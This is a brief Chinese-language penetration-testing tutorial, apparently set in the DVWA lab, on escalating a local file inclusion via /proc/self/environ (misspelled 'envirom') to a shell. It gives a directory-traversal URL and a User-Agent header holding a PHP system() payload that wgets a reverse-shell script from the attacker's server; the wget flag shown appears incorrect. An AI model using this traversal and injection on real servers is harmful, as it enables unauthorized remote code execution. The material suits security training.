# /proc/self/envirom

> * 这是一个在 Linux 中存在的漏洞
> * /proc/self 目录是我们当前正在运行的进程的链接， /proc/self 文件通常被认为更像是一个 “驱动程序”
> * 本章节以 DVWA 做为解释

1. 首先访问受害者地址： http://IP/index.php?page=../../../../proc/self/envirom
2. 然后我们会得到一个 /proc/self/envirom 的响应内容，这意味着文件可由 WEB 服务器读取
3. 下一步抓包，并且设置一个 reverse-shell.php ，然后在本地开启一个 WEB 服务器
4.  然后我们只需要修改

    ```shell
    User-Agent: <?system('wget http://IP/reverse-shell.php -o shell.php') ;?>
    ```
5. 然后我们稍加利用就可以获取一个 SHELL 了

## 参考文章

* [Burp and Proc/self/envirom .it's shell time](https://www.linkedin.com/pulse/burp-procselfenviron-its-shell-time-melina-phillips-cissp-ejpt-sscp/?trk=public\_profile\_article\_view)
